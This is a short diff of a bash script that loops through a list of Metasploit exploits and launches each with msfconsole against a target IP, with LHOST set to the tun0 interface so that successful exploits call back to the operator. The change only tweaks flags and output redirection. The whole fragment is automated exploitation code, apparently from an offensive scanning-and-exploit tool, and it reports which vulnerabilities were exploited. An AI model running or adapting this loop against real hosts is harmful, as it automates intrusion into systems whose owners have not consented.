@@ -157,7 +157,7 @@ do
             # Loop through the exploits and attempt to use them
             for exploit in "${exploits[@]}"; do
                 echo "Using exploit $exploit"
-                msfconsole -q -x "use $exploit; show options; set LHOST tun0; set RHOSTS $IP; run;"
+                msfconsole -x "use $exploit; set LHOST tun0; set RHOSTS $IP; run" 0<&- 1<&- 2<&- >/dev/tty
                 if [ $? -eq 0 ]
                 then
                     echo "Exploited vulnerability $vuln using exploit $exploit"
